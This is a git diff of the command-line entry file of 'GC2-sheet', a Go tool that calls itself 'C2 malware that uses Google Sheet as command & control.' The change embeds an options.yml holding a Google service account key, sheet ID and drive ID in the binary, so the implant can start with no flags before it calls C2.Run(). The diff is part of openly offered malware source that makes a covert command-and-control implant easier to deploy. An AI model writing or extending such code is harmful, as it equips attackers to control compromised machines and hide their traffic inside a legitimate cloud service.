@@ -3,50 +3,71 @@ package cmd
 import (
 	"GC2-sheet/internal/C2"
 	"GC2-sheet/internal/configuration"
-	"github.com/spf13/cobra"
+	"GC2-sheet/internal/utils"
+	_ "embed"
 	"os"
+
+	"github.com/spf13/cobra"
+	"gopkg.in/yaml.v2"
 )
 
 var (
-	credential string
-	sheetId string
-	driveId string
-	debug bool
+	credentialFlag string
+	sheetIdFlag    string
+	driveIdFlag    string
+	debugFlag      bool
+	//go:embed options.yml
+	configurationFileContent []byte
 )
-
-
 
 var rootCmd = &cobra.Command{
 	Use:   "gc2-sheet",
 	Short: "gc2-sheet new C2 malware that uses Google Sheet as command & control.",
-	Long: `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
+	Long:  `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
 	Run: func(cmd *cobra.Command, args []string) {
 
-		configuration.SetOptions(credential, sheetId, driveId, debug) // Comment this line if you want to hardcode the parameters
-		// configuration.SetOptions(<json>, <sheetId>, <driveId>) // Remove comment from this line if you want to hardcode the parameters.
-																	// Json string must but be escaped: " --> \" and \n --> \\n. Example: {"test":"value\n"} --> "{\"test\":\"value\\n\"}"
+		// If flags have not been used, get the configuration file
+		if credentialFlag == "" || sheetIdFlag == "" || driveIdFlag == "" {
+
+			configurationFile := configuration.ConfigurationFile{}
+
+			yaml.Unmarshal(configurationFileContent, &configurationFile)
+
+			configuration.SetOptions(configurationFile.Key, configurationFile.Sheet, configurationFile.Drive, configurationFile.Verbose)
+
+			utils.LogDebug("Using configuration file")
+		} else { // Using standard flags
+			var key []byte
+
+			if credentialFlag != "" {
+				var err error
+				key, err = os.ReadFile(credentialFlag)
+				if err != nil {
+					utils.LogFatalDebug("Key file not found")
+				}
+			}
+			configuration.SetOptions(string(key), sheetIdFlag, driveIdFlag, debugFlag)
+			utils.LogDebug("Using flags")
+		}
+
 		C2.Run()
 
 	},
 }
 
-func init()  {
+func init() {
 
-	rootCmd.Flags().StringVarP(&credential, "key", "k", "", "GCP service account credential in JSON")
-	rootCmd.MarkFlagRequired("key") // Comment the line if you want to hardcode the parameter
+	rootCmd.Flags().StringVarP(&credentialFlag, "key", "k", "", "GCP service account credential in JSON")
 
-	rootCmd.Flags().StringVarP(&sheetId, "sheet", "s", "", "Google sheet ID")
-	rootCmd.MarkFlagRequired("sheet") // Comment the line if you want to hardcode the parameter
+	rootCmd.Flags().StringVarP(&sheetIdFlag, "sheet", "s", "", "Google sheet ID")
 
-	rootCmd.Flags().StringVarP(&driveId, "drive", "d", "", "Google drive ID")
-	rootCmd.MarkFlagRequired("drive") // Comment the line if you want to hardcode the parameter
+	rootCmd.Flags().StringVarP(&driveIdFlag, "drive", "d", "", "Google drive ID")
 
-	rootCmd.Flags().BoolVarP(&debug, "verbose", "v", false, "Enable verbose output")
+	rootCmd.Flags().BoolVarP(&debugFlag, "verbose", "v", false, "Enable verbose output")
 }
 
 func Execute() {
 	if err := rootCmd.Execute(); err != nil {
-
 
 		os.Exit(1)
 	}
